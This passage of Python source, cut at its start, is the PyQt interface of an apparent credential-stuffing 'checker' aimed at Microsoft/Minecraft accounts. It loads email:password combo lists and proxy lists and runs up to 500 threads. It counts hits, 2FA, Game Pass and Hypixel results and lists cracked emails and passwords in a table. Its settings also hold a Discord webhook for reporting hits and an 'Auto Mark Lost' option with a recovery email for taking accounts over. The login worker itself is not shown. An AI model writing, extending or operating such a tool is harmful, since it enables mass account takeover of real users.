        load_combos_btn = QPushButton("Load Combos")
        load_combos_btn.clicked.connect(self.load_combos)
        controls_layout.addWidget(load_combos_btn)
        controls_layout.addWidget(self.combo_label)
        
        # load proxies
        self.proxy_label = QLabel("0 Proxies Loaded")
        load_proxies_btn = QPushButton("Load Proxies")
        load_proxies_btn.clicked.connect(self.load_proxies)
        controls_layout.addWidget(load_proxies_btn)
        controls_layout.addWidget(self.proxy_label)
        
        # load ban proxies
        self.ban_proxy_label = QLabel("0 Ban Proxies Loaded")
        load_ban_proxies_btn = QPushButton("Load Ban Proxies")
        load_ban_proxies_btn.clicked.connect(self.load_ban_proxies)
        controls_layout.addWidget(load_ban_proxies_btn)
        controls_layout.addWidget(self.ban_proxy_label)
        
        # threadz
        self.thread_count_spin = QSpinBox()
        self.thread_count_spin.setRange(1, 500)
        self.thread_count_spin.setValue(100)
        controls_layout.addWidget(QLabel("Threads:"))
        controls_layout.addWidget(self.thread_count_spin)
        

        self.start_btn = QPushButton("Start")
        self.start_btn.clicked.connect(self.start_checker)
        controls_layout.addWidget(self.start_btn)
        
        self.stop_btn = QPushButton("Stop")
        self.stop_btn.clicked.connect(self.stop_checker)
        self.stop_btn.setEnabled(False)
        controls_layout.addWidget(self.stop_btn)
        
        layout.addLayout(controls_layout)
        

        progress_layout = QHBoxLayout()
        

        self.progress_bar = QProgressBar()
        self.progress_bar.setFormat("%v/%m (%p%)")
        progress_layout.addWidget(self.progress_bar)
        
        layout.addLayout(progress_layout)
        

        stats_layout = QHBoxLayout()
        stats_group = QGroupBox("Statistics")
        stats_form = QFormLayout(stats_group)
        
        self.stats_labels = {
            "checked": QLabel("0"),
            "hits": QLabel("0"),
            "bad": QLabel("0"),
            "twofa": QLabel("0"),
            "cpm": QLabel("0"),
            "errors": QLabel("0"),
            "vm": QLabel("0"),
            "sfa": QLabel("0"),
            "mfa": QLabel("0"),
            "xgp": QLabel("0"),
            "xgpu": QLabel("0"),
            "other": QLabel("0")
        }
        
        stats_form.addRow("Checked:", self.stats_labels["checked"])
        stats_form.addRow("Hits:", self.stats_labels["hits"])
        stats_form.addRow("Bad:", self.stats_labels["bad"])
        stats_form.addRow("2FA:", self.stats_labels["twofa"])
        stats_form.addRow("CPM:", self.stats_labels["cpm"])
        stats_form.addRow("Errors:", self.stats_labels["errors"])
        stats_form.addRow("Valid Mail:", self.stats_labels["vm"])
        stats_form.addRow("SFA:", self.stats_labels["sfa"])
        stats_form.addRow("MFA:", self.stats_labels["mfa"])
        stats_form.addRow("Game Pass:", self.stats_labels["xgp"])
        stats_form.addRow("Game Pass Ultimate:", self.stats_labels["xgpu"])
        stats_form.addRow("Other:", self.stats_labels["other"])
        
        stats_layout.addWidget(stats_group)
        

        self.results_table = QTableWidget()
        self.results_table.setColumnCount(8)
        self.results_table.setHorizontalHeaderLabels([
            "Email", "Password", "Username", "Type", 
            "Capes", "Hypixel", "Level", "Banned"
        ])
        self.results_table.horizontalHeader().setStretchLastSection(True)
        

        splitter = QSplitter(Qt.Orientation.Vertical)
        stats_widget = QWidget()
        stats_widget.setLayout(stats_layout)
        splitter.addWidget(stats_widget)
        splitter.addWidget(self.results_table)
        
        layout.addWidget(splitter)

        self.status_label = QLabel("Ready")
        layout.addWidget(self.status_label)
        

        self.combos = []
        self.proxies = []
        self.ban_proxies = []
        self.worker = None
        
    def setup_settings_tab(self, tab):
        layout = QVBoxLayout(tab)
        

        general_group = QGroupBox("General Settings")
        general_layout = QFormLayout(general_group)
        
        # retri
        self.max_retries_spin = QSpinBox()
        self.max_retries_spin.setRange(1, 10)
        self.max_retries_spin.setValue(config.get('maxretries'))
        general_layout.addRow("Max Retries:", self.max_retries_spin)
        
        # proxi
        self.proxy_type_combo = QComboBox()
        self.proxy_type_combo.addItems(["http", "https", "socks4", "socks5"])
        self.proxy_type_combo.setCurrentText(config.get('proxytype'))
        general_layout.addRow("Proxy Type:", self.proxy_type_combo)
        
        layout.addWidget(general_group)
        
        # webhook
        webhook_group = QGroupBox("Discord Webhook")
        webhook_layout = QFormLayout(webhook_group)
        
        # webhook url
        self.webhook_url = QLineEdit()
        self.webhook_url.setText(config.get('webhook'))
        webhook_layout.addRow("Webhook URL:", self.webhook_url)
        
        # webhook message
        self.webhook_message = QTextEdit()
        self.webhook_message.setText(config.get('message'))
        webhook_layout.addRow("Message Template:", self.webhook_message)
        
        layout.addWidget(webhook_group)
        
        
        checks_group = QGroupBox("Account Checks")
        checks_layout = QFormLayout(checks_group)
        
        # create checkboxes
        self.check_boxes = {}
        
        check_options = {
            'hypixelname': "Check Hypixel Name",
            'hypixellevel': "Check Hypixel Level",
            'hypixelfirstlogin': "Check First Hypixel Login",
            'hypixellastlogin': "Check Last Hypixel Login",
            'hypixelbwstars': "Check Bedwars Stars",
            'hypixelsbcoins': "Check Skyblock Coins",
            'optifinecape': "Check Optifine Cape",
            'access': "Check Email Access",
            'namechange': "Check Name Change",
            'lastchanged': "Check Last Name Change",
            'hypixelban': "Check Hypixel Ban"
        }
        
        for key, label in check_options.items():
            self.check_boxes[key] = QCheckBox()
            self.check_boxes[key].setChecked(config.get(key))
            checks_layout.addRow(label, self.check_boxes[key])
            
        # Add automarklost and recovery email fields after the loop
        self.auto_mark_lost_checkbox = QCheckBox("Auto Mark Lost (30d Recovery)")
        self.auto_mark_lost_checkbox.setChecked(config.get('automarklost', False))
        checks_layout.addRow("Auto Mark Lost:", self.auto_mark_lost_checkbox)

        self.recovery_email_input = QLineEdit()
        self.recovery_email_input.setPlaceholderText("Email for automarklost")
        self.recovery_email_input.setText(config.get('recoveryemail', ''))
        checks_layout.addRow("Recovery Email:", self.recovery_email_input)
        
        layout.addWidget(checks_group)
        
        save_btn = QPushButton("Save Settings")
        save_btn.clicked.connect(self.save_settings)
        layout.addWidget(save_btn)
        
    def load_combos(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Combos", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.combos = [line.strip() for line in f if ':' in line]
                self.combo_label.setText(f"{len(self.combos)} Combos Loaded")
                self.progress_bar.setMaximum(len(self.combos))
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load combos: {str(e)}")
                
    def load_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Proxies", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.proxies = [line.strip() for line in f if line.strip()]
                self.proxy_label.setText(f"{len(self.proxies)} Proxies Loaded")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load proxies: {str(e)}")

    def load_ban_proxies(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Load Ban Proxies", "", "Text Files (*.txt)")
        if file_path:
            try:
                with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                    self.ban_proxies = [line.strip() for line in f if line.strip()]
                self.ban_proxy_label.setText(f"{len(self.ban_proxies)} Ban Proxies Loaded")
            except Exception as e:
                QMessageBox.critical(self, "Error", f"Failed to load ban proxies: {str(e)}")
                
    def save_settings(self):
        
        config.set('maxretries', self.max_retries_spin.value())
        config.set('proxytype', self.proxy_type_combo.currentText())
        config.set('webhook', self.webhook_url.text())
        config.set('message', self.webhook_message.toPlainText())
        config.set('automarklost', self.auto_mark_lost_checkbox.isChecked())
        config.set('recoveryemail', self.recovery_email_input.text())
        
        for key, checkbox in self.check_boxes.items():
            config.set(key, checkbox.isChecked())
            
        # save config
        if config.save_to_file("config.ini"):
            QMessageBox.information(self, "Success", "Settings saved successfully")
        else:
            QMessageBox.critical(self, "Error", "Failed to save settings")
            
    def start_checker(self):
        if not self.combos:
            QMessageBox.warning(self, "Warning", "No combos loaded")
            return
            
        if not self.proxies:
            result = QMessageBox.question(self, "Warning", "No proxies loaded. Continue anyway?", 
                                         QMessageBox.StandardButton.Yes | QMessageBox.StandardButton.No)
            if result == QMessageBox.StandardButton.No:
                return
                
        
        timestamp = datetime.now().strftime("%Y-%m-%d")
        result_folder = f"check_{timestamp}"
        
        
        for key in self.stats_labels:
            self.stats_labels[key].setText("0")
            
        
        self.results_table.setRowCount(0)
        
        
        self.start_btn.setEnabled(False)
        self.stop_btn.setEnabled(True)
        
        
        self.worker = CheckerWorker(
            self.combos, 
            self.proxies, 
            self.ban_proxies, 
            self.thread_count_spin.value(),
            result_folder
        )
        
        
        self.worker.progress_signal.connect(self.update_progress)
        self.worker.stats_signal.connect(self.update_stats)
        self.worker.result_signal.connect(self.add_result)
        self.worker.finished_signal.connect(self.checker_finished)
        
        
        self.status_label.setText("Running...")
        self.worker.start()
        
    def stop_checker(self):
        if self.worker and self.worker.running:
            self.worker.stop()
            self.status_label.setText("Stopping...")
            self.stop_btn.setEnabled(False)
            
    def update_progress(self, value):
        self.progress_bar.setValue(value)
        
    def update_stats(self, stats):
        for key, value in stats.items():
            if key in self.stats_labels:
                self.stats_labels[key].setText(str(value))
                
    def add_result(self, data):
        row = self.results_table.rowCount()
        self.results_table.insertRow(row)
        
        
        self.results_table.setItem(row, 0, QTableWidgetItem(data.get('email', '')))
        self.results_table.setItem(row, 1, QTableWidgetItem(data.get('password', '')))
        self.results_table.setItem(row, 2, QTableWidgetItem(data.get('name', '')))
        self.results_table.setItem(row, 3, QTableWidgetItem(data.get('type', '')))
        self.results_table.setItem(row, 4, QTableWidgetItem(data.get('capes', '')))
        self.results_table.setItem(row, 5, QTableWidgetItem(data.get('hypixel', '')))
        self.results_table.setItem(row, 6, QTableWidgetItem(data.get('level', '')))
        self.results_table.setItem(row, 7, QTableWidgetItem(data.get('banned', '')))
        
        
        if data.get('banned') and data.get('banned') != "False" and data.get('banned') != "Unknown":
            for col in range(8):
                item = self.results_table.item(row, col)
                if item:
                    item.setBackground(QColor(255, 200, 200))  
        elif "Ultimate" in data.get('type', ''):
            for col in range(8):
                item = self.results_table.item(row, col)
                if item:
                    item.setBackground(QColor(200, 230, 255))  
        elif "Game Pass" in data.get('type', ''):
            for col in range(8):
                item = self.results_table.item(row, col)
                if item:
                    item.setBackground(QColor(230, 255, 200))  
                    
        
        self.results_table.scrollToBottom()
        
    def checker_finished(self):
        self.start_btn.setEnabled(True)
        self.stop_btn.setEnabled(False)
        self.status_label.setText("Finished")
        QMessageBox.information(self, "Finished", "Checking completed")


def main():
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec())


if __name__ == "__main__":
    main()
